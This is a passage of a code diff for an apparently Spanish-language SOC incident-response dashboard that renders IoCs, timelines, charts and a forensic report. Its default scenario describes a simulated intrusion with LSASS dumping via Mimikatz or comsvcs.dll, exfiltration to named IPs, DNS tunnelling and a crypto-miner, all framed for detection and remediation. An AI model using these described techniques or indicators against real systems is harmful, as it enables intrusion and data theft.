+                    </ul>
+                </div>
+                <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                    <span class="text-[11px] uppercase text-amber-400 font-semibold block mb-1">Cuentas Comprometidas / Objetivo (${extractedIoCs.users.length})</span>
+                    <div class="flex flex-wrap gap-1.5">
+                        ${extractedIoCs.users.map(u => `<span class="px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-amber-300">${escapeHtml(u)}</span>`).join("")}
+                    </div>
+                </div>
+                <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                    <span class="text-[11px] uppercase text-cyan-400 font-semibold block mb-1">Servidores Afectados (${extractedIoCs.hosts.length})</span>
+                    <div class="flex flex-wrap gap-1.5">
+                        ${extractedIoCs.hosts.map(h => `<span class="px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-cyan-300">${escapeHtml(h)}</span>`).join("")}
+                    </div>
+                </div>
+                <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                    <span class="text-[11px] uppercase text-purple-400 font-semibold block mb-1">Artefactos y Comandos Clave</span>
+                    <ul class="space-y-1 text-slate-300 text-[11px]">
+                        ${extractedIoCs.commands.slice(0, 5).map(c => `<li class="truncate" title="${escapeHtml(c)}">• ${escapeHtml(c)}</li>`).join("")}
+                    </ul>
+                </div>
+            `;
+        }
+
+        function renderTimelineSection() {
+            const container = document.getElementById("timeline-container");
+            const suspicious = analyzedLogs.filter(l => {
+                if (!l.isSuspicious) return false;
+                if (activeCategoryFilter !== "ALL" && l.category !== activeCategoryFilter) return false;
+                return true;
+            });
+
+            if (suspicious.length === 0) {
+                container.innerHTML = `<div class="text-xs text-slate-400">No hay eventos sospechosos para esta categoría.</div>`;
+                return;
+            }
+
+            container.innerHTML = suspicious.map(ev => {
+                const dotColor = ev.severity === "Crítico" ? "bg-red-500" : ev.severity === "Alto" ? "bg-orange-400" : "bg-amber-400";
+                return `
+                    <div class="relative bg-slate-950 border border-slate-800 rounded-xl p-4">
+                        <span class="w-3 h-3 rounded-full ${dotColor} absolute -left-[31px] top-5 ring-4 ring-slate-900"></span>
+                        <div class="flex flex-wrap items-center justify-between gap-2 mb-1">
+                            <div class="flex items-center gap-2">
+                                <span class="font-mono text-xs text-cyan-400 font-semibold">${escapeHtml(ev.Timestamp)}</span>
+                                <span class="px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-xs font-semibold text-white">${escapeHtml(ev.category)}</span>
+                                <span class="text-xs font-mono text-slate-400">${escapeHtml(ev.mitre)}</span>
+                            </div>
+                            ${getSeverityBadge(ev.severity)}
+                        </div>
+                        <p class="text-xs text-slate-200 mt-1">${escapeHtml(ev.explanation)}</p>
+                        <div class="mt-2 p-2 rounded-lg bg-slate-900 font-mono text-[11px] text-slate-300 flex flex-wrap items-center justify-between gap-2">
+                            <span><strong>Host:</strong> ${escapeHtml(ev.Host)} | <strong>User:</strong> ${escapeHtml(ev.User)} | <strong>IP:</strong> ${escapeHtml(ev.SourceIP)} → ${escapeHtml(ev.DestIP)}</span>
+                            <span class="text-amber-300">Cmd: ${escapeHtml(ev.Command)}</span>
+                        </div>
+                    </div>
+                `;
+            }).join("");
+        }
+
+        // =====================================================================
+        // 4. PESTAÑA DE CLASIFICACIÓN DE RIESGOS (INTERACTIVA / EDITABLE)
+        // =====================================================================
+        function renderRiskClassificationTab() {
+            const container = document.getElementById("risk-classification-list");
+            container.innerHTML = securityFindings.map((f, idx) => `
+                <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
+                    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
+                        <div>
+                            <div class="flex items-center gap-2">
+                                <span class="font-mono text-xs text-cyan-400 font-bold">${f.id}</span>
+                                <h3 class="text-base font-bold text-white">${f.category}</h3>
+                                <span class="text-xs font-mono text-slate-400">(${f.mitre})</span>
+                            </div>
+                            <p class="text-xs text-slate-400 mt-0.5">${f.count} eventos de evidencia encontrados en los logs del SIEM</p>
+                        </div>
+
+                        <div class="flex items-center gap-3">
+                            <label class="text-xs text-slate-400">Nivel de Riesgo:</label>
+                            <select onchange="updateFindingSeverity(${idx}, this.value)" class="px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-700 text-xs font-bold text-white focus:outline-none focus:border-cyan-400">
+                                <option value="Crítico" ${f.severity === "Crítico" ? "selected" : ""}>Crítico</option>
+                                <option value="Alto" ${f.severity === "Alto" ? "selected" : ""}>Alto</option>
+                                <option value="Medio" ${f.severity === "Medio" ? "selected" : ""}>Medio</option>
+                                <option value="Bajo" ${f.severity === "Bajo" ? "selected" : ""}>Bajo</option>
+                            </select>
+                            ${getSeverityBadge(f.severity)}
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                        <div>
+                            <label class="block text-slate-400 font-semibold mb-1">Justificación de la Criticidad (Editable por Analista SOC L2):</label>
+                            <textarea oninput="updateFindingJustification(${idx}, this.value)" rows="3" class="w-full rounded-xl bg-slate-900 border border-slate-800 p-3 text-slate-200 focus:outline-none focus:border-cyan-400">${escapeHtml(f.justification)}</textarea>
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 font-semibold mb-1">Explicación Técnica del Hallazgo:</label>
+                            <textarea oninput="updateFindingExplanation(${idx}, this.value)" rows="3" class="w-full rounded-xl bg-slate-900 border border-slate-800 p-3 text-slate-200 focus:outline-none focus:border-cyan-400">${escapeHtml(f.technicalExplanation)}</textarea>
+                        </div>
+                    </div>
+                </div>
+            `).join("");
+        }
+
+        function updateFindingSeverity(index, newSeverity) {
+            securityFindings[index].severity = newSeverity;
+            renderRiskClassificationTab();
+            renderSixCategoriesGrid();
+            updateKPIs();
+            updateDashboardCharts();
+            renderTechnicalReport();
+            showToast(`Severidad de '${securityFindings[index].category}' actualizada a ${newSeverity}`, "success");
+        }
+
+        function updateFindingJustification(index, val) {
+            securityFindings[index].justification = val;
+            renderTechnicalReport();
+        }
+
+        function updateFindingExplanation(index, val) {
+            securityFindings[index].technicalExplanation = val;
+            renderTechnicalReport();
+        }
+
+        // =====================================================================
+        // 5. DASHBOARD INTERACTIVO CON CHART.JS
+        // =====================================================================
+        function updateDashboardCharts() {
+            const ctxSeverity = document.getElementById("chart-severity");
+            const ctxCategories = document.getElementById("chart-categories");
+            const ctxTimeline = document.getElementById("chart-timeline");
+            const ctxHosts = document.getElementById("chart-hosts");
+
+            if (!ctxSeverity) return;
+
+            // 1. Conteo por criticidad
+            const sevCounts = { "Crítico": 0, "Alto": 0, "Medio": 0, "Bajo": 0 };
+            analyzedLogs.filter(l => l.isSuspicious).forEach(l => {
+                sevCounts[l.severity] = (sevCounts[l.severity] || 0) + 1;
+            });
+
+            if (severityChartInstance) severityChartInstance.destroy();
+            severityChartInstance = new Chart(ctxSeverity, {
+                type: "doughnut",
+                data: {
+                    labels: ["Crítico", "Alto", "Medio", "Bajo"],
+                    datasets: [{
+                        data: [sevCounts["Crítico"], sevCounts["Alto"], sevCounts["Medio"], sevCounts["Bajo"]],
+                        backgroundColor: ["#ef4444", "#f97316", "#f59e0b", "#3b82f6"],
+                        borderColor: "#111827",
+                        borderWidth: 3
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { position: "bottom", labels: { color: "#cbd5e1", font: { size: 11 } } }
+                    }
+                }
+            });
+
+            // 2. Conteo por las 6 categorías
+            const catLabels = securityFindings.map(f => f.category);
+            const catData = securityFindings.map(f => f.count);
+
+            if (categoriesChartInstance) categoriesChartInstance.destroy();
+            categoriesChartInstance = new Chart(ctxCategories, {
+                type: "bar",
+                data: {
+                    labels: catLabels,
+                    datasets: [{
+                        label: "Eventos Detectados",
+                        data: catData,
+                        backgroundColor: ["#ef4444", "#f59e0b", "#f97316", "#a855f7", "#06b6d4", "#10b981"],
+                        borderRadius: 6
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        x: { ticks: { color: "#cbd5e1", font: { size: 11 } }, grid: { color: "#1e293b" } },
+                        y: { beginAtZero: true, ticks: { color: "#94a3b8", stepSize: 1 }, grid: { color: "#1e293b" } }
+                    },
+                    plugins: { legend: { display: false } }
+                }
+            });
+
+            // 3. Línea de tiempo por bloques de hora/minuto
+            const timeBuckets = {};
+            analyzedLogs.forEach(l => {
+                const slot = String(l.Timestamp).slice(11, 16) || "00:00";
+                if (!timeBuckets[slot]) timeBuckets[slot] = { suspicious: 0, normal: 0 };
+                if (l.isSuspicious) timeBuckets[slot].suspicious++;
+                else timeBuckets[slot].normal++;
+            });
+            const timeLabels = Object.keys(timeBuckets).sort();
+
+            if (timelineChartInstance) timelineChartInstance.destroy();
+            timelineChartInstance = new Chart(ctxTimeline, {
+                type: "line",
+                data: {
+                    labels: timeLabels,
+                    datasets: [
+                        {
+                            label: "Eventos Maliciosos / Sospechosos",
+                            data: timeLabels.map(t => timeBuckets[t].suspicious),
+                            borderColor: "#ef4444",
+                            backgroundColor: "rgba(239, 68, 68, 0.2)",
+                            fill: true,
+                            tension: 0.35
+                        },
+                        {
+                            label: "Eventos Normales",
+                            data: timeLabels.map(t => timeBuckets[t].normal),
+                            borderColor: "#06b6d4",
+                            backgroundColor: "rgba(6, 182, 212, 0.1)",
+                            fill: true,
+                            tension: 0.35
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        x: { ticks: { color: "#94a3b8", font: { size: 10 } }, grid: { color: "#1e293b" } },
+                        y: { beginAtZero: true, ticks: { color: "#94a3b8", stepSize: 1 }, grid: { color: "#1e293b" } }
+                    },
+                    plugins: { legend: { labels: { color: "#cbd5e1", font: { size: 11 } } } }
+                }
+            });
+
+            // 4. Top Hosts Afectados
+            const hostMap = {};
+            analyzedLogs.filter(l => l.isSuspicious).forEach(l => {
+                hostMap[l.Host] = (hostMap[l.Host] || 0) + 1;
+            });
+            const hostLabels = Object.keys(hostMap);
+            const hostCounts = hostLabels.map(h => hostMap[h]);
+
+            if (hostsChartInstance) hostsChartInstance.destroy();
+            hostsChartInstance = new Chart(ctxHosts, {
+                type: "bar",
+                data: {
+                    labels: hostLabels,
+                    datasets: [{
+                        label: "Alertas en Host",
+                        data: hostCounts,
+                        backgroundColor: "#06b6d4",
+                        borderRadius: 6
+                    }]
+                },
+                options: {
+                    indexAxis: "y",
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        x: { beginAtZero: true, ticks: { color: "#94a3b8", stepSize: 1 }, grid: { color: "#1e293b" } },
+                        y: { ticks: { color: "#e2e8f0", font: { family: "JetBrains Mono", size: 11 } }, grid: { color: "#1e293b" } }
+                    },
+                    plugins: { legend: { display: false } }
+                }
+            });
+        }
+
+        // =====================================================================
+        // 6. GENERADOR DEL INFORME TÉCNICO (8 SECCIONES OBLIGATORIAS)
+        // =====================================================================
+        function renderTechnicalReport() {
+            const container = document.getElementById("printable-report");
+            const analystName = document.getElementById("analyst-name-input")?.value || "Analista SOC Nivel 2";
+            const totalLogs = analyzedLogs.length;
+            const suspiciousCount = analyzedLogs.filter(l => l.isSuspicious).length;
+            const reportDate = new Date().toLocaleDateString("es-ES", { year: "numeric", month: "long", day: "numeric" });
+            const isDef = currentMission.isDefault;
+            const mCompany = escapeHtml(currentMission.company);
+            const locLabel = isDef ? "Estocolmo, Suecia" : mCompany;
+            const caseLabel = isDef ? "SE-SOC2-2026-088" : escapeHtml(currentMission.caseId);
+            const sevOrder = ["Bajo", "Medio", "Alto", "Crítico"];
+            const topSev = correlatedIncidents.reduce((a, i) => sevOrder.indexOf(i.severity) > sevOrder.indexOf(a) ? i.severity : a, "Bajo");
+            const riskLabel = isDef ? "CRÍTICO (Múltiples Incidentes)"
+                : (correlatedIncidents.length ? `${topSev.toUpperCase()} (${correlatedIncidents.length} incidente${correlatedIncidents.length === 1 ? "" : "s"})` : "SIN INDICIOS (0 incidentes)");
+            const missionDescHtml = (isDef || !currentMission.description) ? "" : `<p><strong>Contexto de la misión:</strong> ${escapeHtml(currentMission.description)}</p>`;
+            const incListHtml = correlatedIncidents.map(i => `<li><strong>${escapeHtml(i.code)} (Severidad ${escapeHtml(i.severity)}):</strong> ${escapeHtml(i.title)}. Actor: <code>${escapeHtml(i.actorIp)}</code>. Hosts involucrados: ${escapeHtml(i.compromisedHosts.join(", ") || "N/D")}.</li>`).join("");
+            const hostsTxt = escapeHtml(extractedIoCs.hosts.slice(0, 6).join(", ") || "los sistemas afectados");
+            const ipsTxt = escapeHtml(extractedIoCs.ips.slice(0, 4).map(x => x.split(" ")[0]).join(", ") || "las IPs maliciosas identificadas");
+            const usersTxt = escapeHtml(extractedIoCs.users.slice(0, 5).join(", ") || "las cuentas involucradas");
+            const impactHtml = `<div class="p-3.5 rounded-xl bg-red-50 border border-red-200"><strong class="text-red-900 block mb-1">Impacto Operativo y Tecnológico:</strong>Se identificaron ${correlatedIncidents.length} incidente(s) que involucran ${hostsTxt}. Debe validarse el alcance del compromiso de cuentas y sistemas antes de restablecer la operación normal.</div>
+                <div class="p-3.5 rounded-xl bg-amber-50 border border-amber-200"><strong class="text-amber-900 block mb-1">Impacto Legal, Regulatorio y Financiero:</strong>Si se confirma acceso o exfiltración de datos personales o confidenciales de ${mCompany}, evaluar las obligaciones de notificación aplicables a su jurisdicción y sector.</div>`;
+            const planCol = (title, color, items) => `<div class="p-4 rounded-xl bg-slate-50 border border-slate-300"><h3 class="font-bold ${color} uppercase mb-2">${title}</h3><ul class="list-disc pl-4 space-y-1.5 text-slate-700">${items.map(x => `<li>${x}</li>`).join("")}</ul></div>`;
+            const actionPlanHtml =
+                planCol("Fase 1: Investigar (Forense)", "text-cyan-800", [`Preservar imagen forense de memoria y disco de <code>${hostsTxt}</code>.`, "Revisar la línea de tiempo completa de los eventos sospechosos de cada incidente.", `Auditar la actividad reciente de <code>${usersTxt}</code>.`]) +
+                planCol("Fase 2: Contener (Inmediato)", "text-red-800", [`Aislar de la red los hosts <code>${hostsTxt}</code>.`, `Bloquear en el firewall perimetral: <code>${ipsTxt}</code>.`, `Deshabilitar o restringir temporalmente <code>${usersTxt}</code>.`]) +
+                planCol("Fase 3: Remediar (Erradicación)", "text-emerald-800", ["Restablecer credenciales y revocar sesiones activas de las cuentas afectadas.", "Eliminar persistencia, binarios y configuraciones maliciosas halladas.", "Reforzar la monitorización de los indicadores de compromiso durante al menos 30 días."]);
+
+            container.innerHTML = `
+                <!-- CABECERA DEL INFORME FORENSE -->
+                <div class="border-b-2 border-slate-900 pb-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                    <div>
+                        <div class="text-xs font-mono uppercase tracking-widest text-cyan-700 font-bold">NORDICSEC CYBERSECURITY CONSULTING • ${isDef ? "ESTOCOLMO, SUECIA" : mCompany}</div>
+                        <h1 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-1">INFORME TÉCNICO DE RESPUESTA A INCIDENTES (SOC NIVEL 2)</h1>
+                        <p class="text-sm text-slate-600 mt-1">Análisis Forense de Logs SIEM, Indicadores de Compromiso (IoC) y Correlación de Eventos</p>
+                    </div>
+                    <div class="bg-slate-100 border border-slate-300 rounded-xl p-3 text-xs font-mono text-slate-800 shrink-0">
+                        <div><strong>ID Caso:</strong> ${caseLabel}</div>
+                        <div><strong>Fecha:</strong> ${reportDate}</div>
+                        <div><strong>Clasificación:</strong> <span class="text-red-700 font-bold">TLP:AMBER / CONFIDENCIAL</span></div>
+                        <div><strong>Archivo SIEM:</strong> ${escapeHtml(currentDatasetName)}</div>
+                    </div>
+                </div>
+
+                <!-- METADATOS DE LA MISIÓN -->
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 bg-slate-50 border border-slate-200 rounded-xl p-4 text-xs">
+                    <div>
+                        <span class="text-slate-500 block uppercase font-semibold">Ubicación / Consultora:</span>
+                        <strong class="text-slate-900">NordicSec SOC — ${locLabel}</strong>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block uppercase font-semibold">Autor del Informe:</span>
+                        <strong id="report-author-display" class="text-slate-900">${escapeHtml(analystName)}</strong>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block uppercase font-semibold">Nivel de Riesgo Global:</span>
+                        <strong class="text-red-600 uppercase font-extrabold">${riskLabel}</strong>
+                    </div>
+                </div>
+
+                <!-- 1. RESUMEN EJECUTIVO -->
+                <section class="space-y-2">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">1. Resumen Ejecutivo</h2>
+                    <div contenteditable="true" class="text-sm text-slate-700 leading-relaxed space-y-2 p-2 rounded hover:bg-slate-50 focus:outline-cyan-600">
+                        ${missionDescHtml}
+                        <p>
+                            En atención al reporte escalado por ${isDef ? "el cliente corporativo en Estocolmo" : `<strong>${mCompany}</strong>`} tras sospechas de actividad anómala en su infraestructura tecnológica, el equipo de <strong>Analistas SOC Nivel 2</strong> procesó y correlacionó un total de <strong>${totalLogs} registros exportados del SIEM</strong> (archivo <code>${escapeHtml(currentDatasetName)}</code>), identificando <strong>${suspiciousCount} eventos maliciosos de alta prioridad</strong>.
+                        </p>
+                        <p>
+                            <strong>Conclusión de la Misión (¿Uno o varios incidentes?):</strong> El análisis de correlación confirma la existencia de <strong>${correlatedIncidents.length} incidentes de seguridad diferenciados</strong>:
+                        </p>
+                        <ul class="list-disc pl-6 space-y-1">
+${isDef ? `                            <li><strong>Incidente Principal (INC-2026-STHLM-01 - Severidad Crítica):</strong> Una intrusión dirigida completa que inició con un ataque de fuerza bruta contra la pasarela VPN desde el nodo externo <code>185.220.101.45</code>, logrando comprometer la cuenta <code>svc_backup</code> a las 02:15 UTC. Posteriormente, el atacante ejecutó código PowerShell ofuscado, escaló privilegios a <em>Domain Admins</em>, volcó credenciales de LSASS, realizó movimiento lateral por SMB/WinRM/RDP hacia el Controlador de Dominio (<code>STHLM-DC-01</code>) y la Base de Datos de Producción (<code>STHLM-DB-PROD</code>), y finalmente exfiltró <strong>4.8 GB de información confidencial</strong> hacia <code>91.214.124.88</code> manteniendo persistencia por DNS Tunneling.</li>
+                            <li><strong>Incidente Secundario (INC-2026-STHLM-02 - Severidad Alta):</strong> Un ataque oportunista e independiente contra el servidor expuesto en la zona desmilitarizada (<code>STHLM-DMZ-WEB02</code>) desde la IP <code>45.155.205.99</code>, combinando fuerza bruta SSH con la ejecución de un script para instalar el minero de criptomonedas <em>XMRig</em>.</li>` : incListHtml}
+                        </ul>
+                    </div>
+                </section>
+
+                <!-- 2. HALLAZGOS IDENTIFICADOS -->
+                <section class="space-y-3">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">2. Hallazgos Identificados</h2>
+                    <p class="text-xs text-slate-600">Resumen estructurado de los hallazgos detectados en las seis categorías de monitoreo del SOC:</p>
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left border-collapse border border-slate-300 text-xs">
+                            <thead>
+                                <tr class="bg-slate-100 text-slate-800 border-b border-slate-300">
+                                    <th class="p-2.5 border-r border-slate-300">ID</th>
+                                    <th class="p-2.5 border-r border-slate-300">Categoría de Amenaza</th>
+                                    <th class="p-2.5 border-r border-slate-300">Táctica / Técnica MITRE ATT&CK</th>
+                                    <th class="p-2.5 border-r border-slate-300">Eventos</th>
+                                    <th class="p-2.5">Criticidad</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-200">
+                                ${securityFindings.map(f => `
+                                    <tr>
+                                        <td class="p-2.5 font-mono font-bold border-r border-slate-200">${f.id}</td>
+                                        <td class="p-2.5 font-bold text-slate-900 border-r border-slate-200">${escapeHtml(f.category)}</td>
+                                        <td class="p-2.5 font-mono text-slate-700 border-r border-slate-200">${escapeHtml(f.mitre)}</td>
+                                        <td class="p-2.5 font-mono font-semibold border-r border-slate-200">${f.count} registros</td>
+                                        <td class="p-2.5 font-bold ${f.severity === 'Crítico' ? 'text-red-700' : f.severity === 'Alto' ? 'text-orange-600' : 'text-slate-700'}">${f.severity.toUpperCase()} (CVSS ${f.cvss})</td>
+                                    </tr>
+                                `).join("")}
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- 3. EXPLICACIÓN TÉCNICA DE CADA HALLAZGO -->
+                <section class="space-y-3">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">3. Explicación Técnica de Cada Hallazgo</h2>
+                    <div class="space-y-3">
+                        ${securityFindings.map(f => `
+                            <div class="p-3.5 rounded-xl bg-slate-50 border border-slate-200">
+                                <div class="flex items-center justify-between mb-1">
+                                    <h3 class="text-sm font-bold text-slate-900">${f.id} — ${escapeHtml(f.category)} <span class="text-xs font-mono text-slate-500">(${escapeHtml(f.mitre)})</span></h3>
+                                    <span class="text-xs font-bold uppercase ${f.severity === 'Crítico' ? 'text-red-700' : 'text-orange-600'}">${f.severity}</span>
+                                </div>
+                                <p contenteditable="true" class="text-xs text-slate-700 leading-relaxed">${escapeHtml(f.technicalExplanation)}</p>
+                            </div>
+                        `).join("")}
+                    </div>
+                </section>
+
+                <!-- 4. EVIDENCIAS ENCONTRADAS EN LOS LOGS -->
+                <section class="space-y-3">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">4. Evidencias Encontradas en los Logs e Indicadores de Compromiso (IoC)</h2>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs mb-3">
+                        <div class="p-3 rounded-xl bg-slate-50 border border-slate-200">
+                            <strong class="text-slate-900 block mb-1">IPs y Dominios Maliciosos Confirmados:</strong>
+                            <ul class="list-disc pl-4 font-mono text-[11px] text-slate-700 space-y-0.5">
+                                ${extractedIoCs.ips.map(i => `<li>${escapeHtml(i)}</li>`).join("")}
+                            </ul>
+                        </div>
+                        <div class="p-3 rounded-xl bg-slate-50 border border-slate-200">
+                            <strong class="text-slate-900 block mb-1">Cuentas y Servidores Comprometidos:</strong>
+                            <p class="text-[11px] text-slate-700 mb-1"><strong>Usuarios:</strong> <span class="font-mono">${escapeHtml(extractedIoCs.users.join(", "))}</span></p>
+                            <p class="text-[11px] text-slate-700"><strong>Equipos (Hosts):</strong> <span class="font-mono">${escapeHtml(extractedIoCs.hosts.join(", "))}</span></p>
+                        </div>
+                    </div>
+
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left border-collapse border border-slate-300 text-[11px] font-mono">
+                            <thead>
+                                <tr class="bg-slate-100 text-slate-800 border-b border-slate-300">
+                                    <th class="p-2 border-r border-slate-300">Timestamp</th>
+                                    <th class="p-2 border-r border-slate-300">Host / Usuario</th>
+                                    <th class="p-2 border-r border-slate-300">IP Origen → Destino</th>
+                                    <th class="p-2 border-r border-slate-300">Categoría</th>
+                                    <th class="p-2">Artefacto / Comando en Log</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-200">
+                                ${analyzedLogs.filter(l => l.isSuspicious).map(ev => `
+                                    <tr>
+                                        <td class="p-2 border-r border-slate-200 whitespace-nowrap">${escapeHtml(ev.Timestamp)}</td>
+                                        <td class="p-2 border-r border-slate-200">${escapeHtml(ev.Host)} (${escapeHtml(ev.User)})</td>
+                                        <td class="p-2 border-r border-slate-200 whitespace-nowrap">${escapeHtml(ev.SourceIP)} → ${escapeHtml(ev.DestIP)}</td>
+                                        <td class="p-2 border-r border-slate-200 font-sans font-semibold">${escapeHtml(ev.category)}</td>
+                                        <td class="p-2 text-slate-800">${escapeHtml(ev.Command)}</td>
+                                    </tr>
+                                `).join("")}
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- 5. CRITICIDAD Y JUSTIFICACIÓN -->
+                <section class="space-y-3">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">5. Criticidad y Justificación</h2>
+                    <p class="text-xs text-slate-700">
+                        La calificación global del incidente se establece en nivel <strong>CRÍTICO</strong>. A continuación se documenta la justificación técnica de cada categoría evaluada:
+                    </p>
+                    <div class="space-y-2 text-xs">
+                        ${securityFindings.map(f => `
+                            <div class="p-3 rounded-xl border border-slate-200 bg-white">
+                                <span class="font-bold text-slate-900">${escapeHtml(f.category)} — Nivel ${f.severity.toUpperCase()} (CVSS ${f.cvss}):</span>
+                                <span contenteditable="true" class="text-slate-700 ml-1">${escapeHtml(f.justification)}</span>
+                            </div>
+                        `).join("")}
+                    </div>
+                </section>
+
+                <!-- 6. POSIBLE IMPACTO EN LA ORGANIZACIÓN -->
+                <section class="space-y-2">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">6. Posible Impacto en la Organización</h2>
+                    <div contenteditable="true" class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs text-slate-700">
+${isDef ? `                        <div class="p-3.5 rounded-xl bg-red-50 border border-red-200">
+                            <strong class="text-red-900 block mb-1">Impacto Operativo y Tecnológico:</strong>
+                            Compromiso total del dominio Active Directory (<code>STHLM-DC-01</code>). El atacante posee privilegios de Administrador de Dominio, lo que le permitiría desplegar Ransomware masivo en toda la red si no se contiene de inmediato.
+                        </div>
+                        <div class="p-3.5 rounded-xl bg-amber-50 border border-amber-200">
+                            <strong class="text-amber-900 block mb-1">Impacto Legal, Regulatorio (GDPR Suecia) y Financiero:</strong>
+                            La exfiltración confirmada de 4.8 GB del archivo <code>Customers.bak</code> compromete datos personales y financieros de clientes, obligando a notificar a la autoridad sueca de protección de datos (IMY) en un plazo máximo de 72 horas bajo el RGPD/GDPR.
+                        </div>` : impactHtml}
+                    </div>
+                </section>
+
+                <!-- 7. PLAN DE ACCIÓN: INVESTIGAR, CONTENER Y REMEDIAR -->
+                <section class="space-y-3">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">7. Plan de Acción: Investigar, Contener y Remediar</h2>
+                    <div contenteditable="true" class="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
+${isDef ? `                        <div class="p-4 rounded-xl bg-slate-50 border border-slate-300">
+                            <h3 class="font-bold text-cyan-800 uppercase mb-2">Fase 1: Investigar (Forense)</h3>
+                            <ul class="list-disc pl-4 space-y-1.5 text-slate-700">
+                                <li>Preservar imagen forense de memoria RAM y disco de <code>STHLM-APP-02</code>, <code>STHLM-DC-01</code> y <code>STHLM-DB-PROD</code>.</li>
+                                <li>Analizar el contenido exacto del paquete <code>C:\\ProgramData\\clientes_se.7z</code> para determinar el alcance de los registros exfiltrados.</li>
+                                <li>Auditar todos los tickets Kerberos emitidos (búsqueda de ataques Golden Ticket) tras el volcado de <code>lsass.dmp</code>.</li>
+                            </ul>
+                        </div>
+                        <div class="p-4 rounded-xl bg-slate-50 border border-slate-300">
+                            <h3 class="font-bold text-red-800 uppercase mb-2">Fase 2: Contener (Inmediato)</h3>
+                            <ul class="list-disc pl-4 space-y-1.5 text-slate-700">
+                                <li>Aislar de la red en el EDR los hosts <code>STHLM-APP-02</code>, <code>STHLM-DB-PROD</code> y <code>STHLM-DMZ-WEB02</code>.</li>
+                                <li>Deshabilitar de inmediato la cuenta comprometida <code>svc_backup</code> y revocar sus sesiones activas en VPN y Directorio Activo.</li>
+                                <li>Bloquear en el Firewall perimetral las IPs <code>185.220.101.45</code>, <code>91.214.124.88</code>, <code>45.155.205.99</code> y el dominio <code>c2-update-nordic.xyz</code>.</li>
+                            </ul>
+                        </div>
+                        <div class="p-4 rounded-xl bg-slate-50 border border-slate-300">
+                            <h3 class="font-bold text-emerald-800 uppercase mb-2">Fase 3: Remediar (Erradicación)</h3>
+                            <ul class="list-disc pl-4 space-y-1.5 text-slate-700">
+                                <li>Remover a <code>svc_backup</code> de los grupos <em>Domain Admins</em> y <em>Administrators</em>.</li>
+                                <li>Forzar el restablecimiento de contraseñas de todas las cuentas privilegiadas y doble rotación de la cuenta <code>krbtgt</code> del dominio.</li>
+                                <li>Eliminar el contenedor web vulnerable en <code>STHLM-DMZ-WEB02</code>, parchar el CMS/servidor web y reconstruir desde imagen limpia.</li>
+                            </ul>
+                        </div>` : actionPlanHtml}
+                    </div>
+                </section>
+
+                <!-- 8. RECOMENDACIONES GENERALES DE SEGURIDAD -->
+                <section class="space-y-2">
+                    <h2 class="text-lg font-bold text-slate-900 border-l-4 border-cyan-600 pl-3 uppercase tracking-wide">8. Recomendaciones Generales de Seguridad</h2>
+                    <ul contenteditable="true" class="list-decimal pl-5 text-xs text-slate-700 space-y-1.5">
+                        <li><strong>Autenticación Multifactor (MFA) y Restricción de Cuentas de Servicio:</strong> Implementar MFA obligatorio en todos los accesos VPN y prohibir por directiva GPO que las cuentas de servicio (<code>svc_*</code>) inicien sesiones interactivas remotas (LogonType 10 / RDP) o accedan desde fuera de la red interna.</li>
+                        <li><strong>Protección contra Volcado de Credenciales (LSASS):</strong> Activar <em>Windows Defender Credential Guard</em> y configurar la clave de registro <code>RunAsPPL</code> (Protected Process Light) para impedir el volcado de memoria LSASS con herramientas como Mimikatz o <code>comsvcs.dll</code>.</li>
+                        <li><strong>Segmentación de Red y Restricción de Movimiento Lateral:</strong> Restringir el tráfico SMB (445), WinRM (5985/5986) y RDP (3389) entre servidores de aplicaciones y Controladores de Dominio mediante microsegmentación y uso obligatorio de estaciones de salto (Jump Hosts / PAW).</li>
+                        <li><strong>Prevención de Exfiltración (DLP) y Filtrado DNS:</strong> Implementar inspección SSL/TLS saliente, bloquear puertos no estándar (como 8443 y 3333) en el firewall perimetral y desplegar filtrado DNS corporativo para detectar túneles DNS de alta entropía.</li>
+                    </ul>
+                </section>
+
+                <!-- FIRMA DEL INFORME -->
